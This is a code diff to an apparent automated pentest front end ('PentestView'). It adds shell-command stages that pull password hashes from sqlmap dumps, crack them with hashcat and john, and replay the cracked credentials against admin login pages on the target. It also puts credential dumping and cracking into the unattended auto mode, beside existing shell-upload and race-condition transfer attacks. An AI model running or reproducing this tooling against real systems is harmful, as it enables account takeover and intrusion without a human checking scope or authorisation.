@@ -1028,6 +1028,7 @@ const TOOL_BINS = {
   testssl: 'testssl.sh',  hydra: 'hydra',     ssti_check: 'nuclei', jwt_check: 'nuclei',
   admin_takeover: 'nuclei', cookie_tamper: 'curl', session_test: 'nuclei',
   wpscan: 'wpscan',  race_cond: 'curl',
+  hash_crack: 'hashcat', cred_test: 'curl',
 };
 
 function PentestView({ apiKey, mcpUrl, mcpTools }) {
@@ -1044,13 +1045,14 @@ function PentestView({ apiKey, mcpUrl, mcpTools }) {
     shell_upload: false, cred_dump: false,  xss_inject: false,
     testssl: false, hydra: false, ssti_check: false, jwt_check: false, admin_takeover: false,
     cookie_tamper: false, session_test: false, wpscan: false, race_cond: false,
+    hash_crack: false, cred_test: false,
   });
   const [autoMode,   setAutoMode]   = useState(false);
   const [xssCallback,setXssCallback]= useState('');
   const PRIMARY   = ['subfinder','httpx','ghauri','ffuf','aquatone','burp_suite'];
   const SECONDARY = ['naabu_scan','katana_crawl','nuclei_fast','nuclei_exploit','sqli_scan','xss_check','cors_check','js_analyze','dir_fuzz','ssrf_check','lfi_test','testssl','ssti_check','jwt_check','admin_takeover','session_test','wpscan'];
-  const EXPLOIT   = ['shell_upload','cred_dump','xss_inject','hydra','cookie_tamper','race_cond'];
-  const AUTO_TOOLS = ['subfinder','httpx','naabu_scan','nuclei_fast','nuclei_exploit','ffuf','sqli_scan','xss_check','cors_check','ssrf_check','lfi_test','js_analyze','ghauri','testssl','ssti_check','jwt_check','admin_takeover','session_test'];
+  const EXPLOIT   = ['shell_upload','cred_dump','xss_inject','hydra','cookie_tamper','race_cond','hash_crack','cred_test'];
+  const AUTO_TOOLS = ['subfinder','httpx','naabu_scan','nuclei_fast','nuclei_exploit','ffuf','sqli_scan','xss_check','cors_check','ssrf_check','lfi_test','js_analyze','ghauri','testssl','ssti_check','jwt_check','admin_takeover','session_test','cred_dump','hash_crack','cred_test'];
   const logRef = useRef(null);
 
   useEffect(() => {
@@ -1118,6 +1120,51 @@ curl -si "$TARGET" -H "Cookie: session=AAAAAAAAAAAAAAAA" | head -20
     wpscan:         { tool: 'shell',   args: (t) => ({ command: `wpscan --url "${t}" --enumerate vp,u,ap --no-banner 2>/dev/null | head -100` }) },
     race_cond:      { tool: 'shell',   args: (t) => ({ command: `echo "=== RACE CONDITION TEST ==="
 for i in $(seq 1 10); do curl -si -X POST "${t}" -d 'amount=1000&action=transfer' -H 'Content-Type: application/x-www-form-urlencoded' -o /dev/null -w "%{http_code} " & done; wait; echo` }) },
+    hash_crack:     { tool: 'shell',   args: (t) => ({ command: `
+HASHFILE="/tmp/kgb_hashes_$(date +%s).txt"
+DUMPED=$(find /tmp -name 'sqlmap*' -newer /tmp -type f 2>/dev/null | xargs grep -hE '[a-f0-9]{32,}|\$2[aby]\$|\$1\$|\$5\$|\$6\$' 2>/dev/null | head -50)
+if [ -z "$DUMPED" ]; then
+  echo "[INFO] Nenhum hash encontrado em dumps recentes. Usa: echo HASH > /tmp/kgb_hashes.txt e corre manualmente."
+else
+  echo "$DUMPED" > "$HASHFILE"
+  echo "=== HASHES ENCONTRADOS ==="
+  cat "$HASHFILE"
+  echo "=== IDENTIFICANDO TIPO ==="
+  hashid $(head -1 "$HASHFILE") 2>/dev/null | head -8
+  echo "=== CRACK MD5 (-m 0) ==="
+  hashcat -a 0 -m 0 "$HASHFILE" /usr/share/wordlists/rockyou.txt --force --quiet 2>/dev/null | head -20
+  echo "=== CRACK SHA1 (-m 100) ==="
+  hashcat -a 0 -m 100 "$HASHFILE" /usr/share/wordlists/rockyou.txt --force --quiet 2>/dev/null | head -20
+  echo "=== CRACK BCRYPT (-m 3200) ==="
+  hashcat -a 0 -m 3200 "$HASHFILE" /usr/share/wordlists/rockyou.txt --force --quiet 2>/dev/null | head -10
+  echo "=== JOHN FALLBACK ==="
+  john --wordlist=/usr/share/wordlists/rockyou.txt "$HASHFILE" 2>/dev/null
+  john --show "$HASHFILE" 2>/dev/null | head -20
+fi
+`.trim() }) },
+    cred_test:      { tool: 'shell',   args: (t) => ({ command: `
+echo "=== TESTANDO CREDENCIAIS CRACADAS ==="
+CRACKED=$(john --show /tmp/kgb_hashes_*.txt 2>/dev/null | grep ':' | head -20)
+if [ -z "$CRACKED" ]; then
+  CRACKED=$(hashcat --show /tmp/kgb_hashes_*.txt 2>/dev/null | head -20)
+fi
+if [ -z "$CRACKED" ]; then
+  echo "[INFO] Nenhuma password cracada ainda. Aguarda o hash_crack terminar."
+else
+  echo "Passwords cracadas:"
+  echo "$CRACKED"
+  echo "=== TESTANDO NO ADMIN PANEL ==="
+  for ADMIN_PATH in /admin /admin/login /wp-admin /administrator /login /panel /dashboard /cp; do
+    CODE=$(curl -s -o /dev/null -w '%{http_code}' "${t}${ADMIN_PATH}" 2>/dev/null)
+    [ "$CODE" != "404" ] && [ "$CODE" != "000" ] && echo "PANEL_FOUND: ${t}${ADMIN_PATH} [$CODE]"
+  done
+  echo "=== HYDRA COM CREDS CRACADAS ==="
+  echo "$CRACKED" | while IFS=: read user pass extra; do
+    [ -n "$user" ] && [ -n "$pass" ] && \
+    curl -si -X POST "${t}/admin/login" -d "username=${user}&password=${pass}" -L | grep -i 'dashboard\|welcome\|logout\|admin' | head -3
+  done
+fi
+`.trim() }) },
   };
 
   const runToolParallel = async (selected, tgt) => {
